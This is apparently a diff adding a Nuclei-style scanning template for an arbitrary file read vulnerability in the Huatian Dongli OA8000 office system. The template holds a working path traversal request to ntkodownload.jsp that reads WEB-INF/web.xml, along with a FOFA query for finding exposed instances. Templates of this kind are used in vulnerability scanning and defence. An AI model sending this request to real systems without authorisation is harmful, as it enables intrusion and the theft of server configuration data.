@@ -1,0 +1,32 @@
+id: huatiandongliOA8000-ntkodownload-file-read
+
+info:
+  name: 华天动力OA8000办公系统-ntkodownload-任意文件读取漏洞
+  author: candada
+  severity: high
+  description: '华天动力是我国首批OA企业,是双软认证的高新技术企业,专注OA办公系统20余年,开放免费OA系统下载试用,旗下OA产品累计为37500多个客户提供高效OA办公体验,为各类政府企业提供高端高效OA系统产品,华天动力OA办公系统存在任意文件读取漏洞。'
+  reference:
+    - https://
+  tags: 2024,华天动力,file-read,华天动力协同oa办公系统,cnpower-oa
+  metadata: 
+    fofa-query: app="华天动力-OA8000"
+
+http:
+  - raw:
+      - |+
+        GET /OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - web-app
+      - type: status
+        status:
+          - 200
